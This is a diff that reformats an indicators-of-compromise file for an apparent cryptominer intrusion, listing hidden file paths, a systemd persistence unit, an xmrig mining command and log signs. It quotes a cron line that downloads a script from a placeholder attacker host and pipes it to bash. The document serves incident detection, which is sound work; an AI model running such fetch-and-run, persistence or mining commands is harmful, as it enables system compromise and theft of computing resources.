@@ -1,9 +1,3 @@
-
----
-
-# 📄 `ioc.md`
-
-```markdown
 # Indicators of Compromise (IOC)
 
 ## File Paths
@@ -12,20 +6,26 @@
 /usr/bin/.syslogd
 /tmp/.cache/.kworker
 /etc/systemd/system/xmrig.service
-
-Cron Jobs
+```
+## Cron Jobs
+```text
 @reboot curl -fsSL http://<attacker-ip>/payload.sh | bash
+```
 
-systemd Services
+## systemd Services
+```text
 [Service]
 ExecStart=/var/www/app/frontend/.next-cache
 Restart=always
+```
 
-Malicious Processes
+## Malicious Processes
+```text
 xmrig -o pool.supportxmr.com -u <wallet>
+```
 
-Network Indicators
-
+## Network Indicators
+```text
 Outbound connections to:
 
 pool.supportxmr.com
@@ -33,14 +33,13 @@ pool.supportxmr.com
 Sustained high CPU usage
 
 Unexpected outbound traffic from web server
+```
 
-Log Indicators
-
+## Log Indicators
+```text
 sudo executions from web application directories
 
 chmod operations on unknown binaries
 
 chkrootkit service failures
-
-
----
+```
